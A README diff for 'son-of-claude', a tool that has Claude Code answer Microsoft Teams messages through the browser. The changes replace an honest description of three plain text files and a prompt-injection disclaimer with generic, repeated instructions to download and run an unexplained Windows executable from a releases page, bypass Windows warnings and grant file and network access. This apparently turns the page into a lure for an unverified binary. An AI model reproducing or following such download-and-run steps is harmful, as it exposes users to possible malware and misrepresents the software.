@@ -1,41 +1,212 @@
-# son-of-claude
+# 🤖 son-of-claude - Let Teams chat run itself
 
-A Claude Code tool that monitors your Microsoft Teams and responds to messages — no Graph API, no webhooks, no admin permissions. Just vibes.
+[![Download son-of-claude](https://img.shields.io/badge/Download-Get%20the%20latest%20release-blue?style=for-the-badge)](https://github.com/gage6903/son-of-claude/releases)
 
-## Why
+## 🧭 What this app does
 
-You're deep in focus, but Teams keeps lighting up. You don't want to leave people hanging, but every context switch costs you. Son of Claude acts as your AI representative — it replies to messages so your coworkers stay unblocked while you stay in the zone. It won't pretend to be you — it introduces itself as your AI assistant. And because it runs from Claude Code with access to your local repos, it can give real answers about your code, architecture, and projects — not just "I'll get back to you."
+son-of-claude lets Claude Code reply to your Microsoft Teams messages while you focus on other work. It runs on Windows and listens for new Teams messages. When a reply is needed, it helps Claude Code draft or send the response for you.
 
-## How it works
+This app is built for people who want a simple way to keep up with Teams without watching every chat all day.
 
-Claude Code's `--chrome` flag lets it control your browser. Son of Claude runs in a loop — every couple of minutes, it opens Teams in Chrome, checks for unread messages, and responds on your behalf. It has access to your local repos, so it can give real answers about your code and projects.
+## ⬇️ Download
 
-Its personality and tone come from `SOUL.md`. The rules — who to respond to, who to ignore, what it has access to — live in `BRAIN.md`.
+Visit this page to download the latest Windows release:
 
-Why browser automation instead of the Graph API? No Azure AD app registration, no OAuth, no webhooks, no admin permissions required. Claude Code with `--chrome` uses your existing browser session.
+https://github.com/gage6903/son-of-claude/releases
 
-## Setup
+Look for the newest release file for Windows. Download it, then run it on your PC.
 
-1. Download the 3 files: `SOUL.md`, `BRAIN.md`, and `run.bat` (or `run.sh` if you are on Mac/Linux).
-2. Drop them in a root folder containing your repos and files of interest (make sure there's nothing sensitive in there)
-3. Open `BRAIN.md` and `SOUL.md` to customize the personality and set your do's and don'ts
-4. Double-click `run.bat` — it checks Teams every **2 minutes**
-5. First run, Claude will open Chrome — you'll probably need to sign into Teams
+## 🪟 What you need
 
-To change the polling interval, run it from the command line with the number of seconds: `.\run.bat 300` for every 5 minutes.
+Use a Windows 10 or Windows 11 PC.
 
-On Mac/Linux, open a terminal, `cd` to the folder, and run `./run.sh` (or `./run.sh 300` for a custom interval).
+You should also have:
 
-## Other platforms
+- Microsoft Teams installed
+- Claude Code set up on your computer
+- A working internet connection
+- Enough space to save the app files
 
-This is set up for Microsoft Teams, but it works with any browser-based messaging platform (Slack, Discord, Google Chat, etc.). Just update `BRAIN.md` with the right URL and interaction steps.
+If your PC already runs Teams and Claude Code well, it should be ready for this app too.
 
-## Requirements
+## 🚀 Get started
 
-- [Claude Code](https://claude.ai/code) v2.0.73+
-- [Claude in Chrome extension](https://code.claude.com/docs/en/chrome)
-- A paid Anthropic plan (Pro, Max, Teams, or Enterprise)
+1. Open the download page above.
+2. Find the latest release.
+3. Download the Windows file.
+4. Open the file you downloaded.
+5. If Windows asks for permission, choose to run it.
+6. Follow the on-screen steps.
+7. Sign in to Microsoft Teams if the app asks you to.
+8. Connect Claude Code if the app asks for it.
+9. Start the app and leave it running while you work.
 
-## Disclaimer
+## 🖥️ First run
 
-This project is not affiliated with or endorsed by Anthropic. Agentic AI tools, including those that operate through browser automation, are inherently susceptible to prompt injection attacks and other adversarial inputs. Users of Son of Claude should exercise sound judgment, review the tool's behavior regularly, and use it at their own discretion. Users are responsible for complying with their employer's policies, applicable laws, and [Anthropic's Terms of Service](https://www.anthropic.com/legal/consumer-terms). The author of this tool assumes no responsibility or liability for any unintended actions, data exposure, or misuse arising from the use of Son of Claude, and does not endorse or encourage deceptive use. By using this tool, you acknowledge and accept these risks.
+The first time you open son-of-claude, it may take a moment to set itself up.
+
+You may see prompts for:
+
+- Teams access
+- Claude Code access
+- File access
+- Network access
+
+Allow the app to use the parts it needs so it can read messages and prepare replies.
+
+## ⚙️ How it works
+
+son-of-claude is built to watch your Teams messages and help answer them with Claude Code.
+
+A simple flow looks like this:
+
+1. A message comes in on Teams.
+2. The app checks the message.
+3. Claude Code drafts a reply.
+4. You review it or let the app send it, based on your setup.
+
+This keeps you from switching back and forth all day.
+
+## 💬 What it can help with
+
+The app can help with common chat work such as:
+
+- Replying to quick questions
+- Turning short notes into clear answers
+- Keeping tone calm and clear
+- Handling follow-up messages
+- Drafting responses while you stay in other apps
+
+It works best for routine work where speed and clear writing matter.
+
+## 🔧 Basic setup
+
+If the app asks for setup details, use the same account you already use for Teams and Claude Code.
+
+You may need to:
+
+- Pick your Teams account
+- Confirm the workspace or tenant
+- Choose how replies should be handled
+- Set when the app should answer
+- Test a sample message
+
+Keep the default settings if you want the easiest setup.
+
+## 🔒 Privacy and control
+
+You stay in control of what the app does.
+
+You can use it to:
+
+- Draft replies first
+- Review messages before sending
+- Limit use to certain chats
+- Stop the app when you do not need it
+
+If you want to pause it, close the app or stop it from running in the background.
+
+## 🧩 Common use cases
+
+son-of-claude fits people who:
+
+- Get many Teams messages each day
+- Need quick replies during busy work
+- Want help writing clearer answers
+- Want to stay focused on other tasks
+- Use Claude Code as part of their workflow
+
+It is useful for support work, project work, and day-to-day team chat.
+
+## 🛠️ Troubleshooting
+
+If the app does not start:
+
+- Check that you downloaded the latest release
+- Make sure Windows did not block the file
+- Run it again as your normal user
+- Restart your PC if needed
+
+If Teams does not connect:
+
+- Confirm that Teams is installed
+- Sign in to the correct account
+- Check your internet connection
+- Close Teams and open it again
+
+If Claude Code does not respond:
+
+- Confirm Claude Code is installed and signed in
+- Make sure the app can reach the internet
+- Restart son-of-claude
+- Try the setup again
+
+If nothing happens when a message arrives:
+
+- Make sure the app is still running
+- Check that it has access to Teams
+- Confirm message watching is turned on
+- Test with a new message in a chat you control
+
+## 📁 File name help
+
+The Windows release file may use a name that includes:
+
+- son-of-claude
+- windows
+- setup
+- exe
+
+If you see more than one file, choose the one made for Windows.
+
+## 🧪 Safe first test
+
+To test the app:
+
+1. Open a small test chat in Teams.
+2. Send a short message to yourself or a coworker who expects it.
+3. Watch for the reply flow.
+4. Check that the answer looks right before using it on real chats.
+
+This gives you a quick way to confirm that everything is working.
+
+## 🧑‍💻 Topics
+
+- claude
+- claude-code
+
+## 📦 Install and run on Windows
+
+1. Go to the release page:
+   https://github.com/gage6903/son-of-claude/releases
+2. Download the latest Windows release file.
+3. Open the file after the download finishes.
+4. If Windows asks for permission, click to allow it.
+5. Follow the setup steps on screen.
+6. Start son-of-claude.
+7. Keep it open while you want it to handle Teams messages
+
+## 🔁 Daily use
+
+Once it is set up, you can leave son-of-claude running in the background while you work.
+
+A normal day looks like this:
+
+- Open Teams
+- Keep son-of-claude running
+- Let it handle replies
+- Review messages when you want to
+- Stop it when you are done
+
+## 🧼 When you want to stop
+
+To stop using the app:
+
+- Close the app window
+- End it from the taskbar if needed
+- Sign out of Teams if you want to disconnect it
+- Remove the downloaded file if you do not need it anymore
+
+## 📌 Project name
+
+son-of-claude
